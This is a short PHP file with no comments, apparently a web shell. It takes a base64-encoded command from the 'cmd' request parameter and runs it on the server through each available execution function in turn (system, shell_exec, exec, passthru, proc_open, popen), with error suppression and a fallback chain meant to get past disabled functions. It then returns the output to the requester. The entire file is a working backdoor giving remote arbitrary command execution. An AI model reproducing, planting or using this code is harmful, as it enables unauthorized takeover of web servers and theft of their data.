<?php
function exe($s_c){
	$s_out = "";
	$s_c = $s_c." 2>&1";

	if(is_callable('system')) {
		ob_start();
		@system($s_c);
		$s_out = ob_get_contents();
		ob_end_clean();
		if(!empty($s_out)) return $s_out;
	}
	if(is_callable('shell_exec')){
		$s_out = @shell_exec($s_c);
		if(!empty($s_out)) return $s_out;
	}
	if(is_callable('exec')) {
		@exec($s_c,$s_r);
		if(!empty($s_r)) foreach($s_r as $s_s) $s_out .= $s_s;
		if(!empty($s_out)) return $s_out;
	}
	if(is_callable('passthru')) {
		ob_start();
		@passthru($s_c);
		$s_out = ob_get_contents();
		ob_end_clean();
		if(!empty($s_out)) return $s_out;
	}
	if(is_callable('proc_open')) {
		$s_descriptorspec = array(
		0 => array("pipe", "r"),
		1 => array("pipe", "w"),
		2 => array("pipe", "w")
		);
		$s_proc = @proc_open($s_c, $s_descriptorspec, $s_pipes, getcwd(), array());
		if (is_resource($s_proc)) {
			while ($s_si = fgets($s_pipes[1])) {
				if(!empty($s_si)) $s_out .= $s_si;
			}
			while ($s_se = fgets($s_pipes[2])) {
				if(!empty($s_se)) $s_out .= $s_se;
			}
		}
		@proc_close($s_proc);
		if(!empty($s_out)) return $s_out;
	}
	if(is_callable('popen')){
		$s_f = @popen($s_c, 'r');
		if($s_f){
			while(!feof($s_f)){
				$s_out .= fread($s_f, 2096);
			}
			pclose($s_f);
		}
		if(!empty($s_out)) return $s_out;
	}
	return "";
}

if(isset($_REQUEST['cmd'])){
	$s_cmd = base64_decode($_REQUEST['cmd']);
	echo exe($s_cmd);
}
?>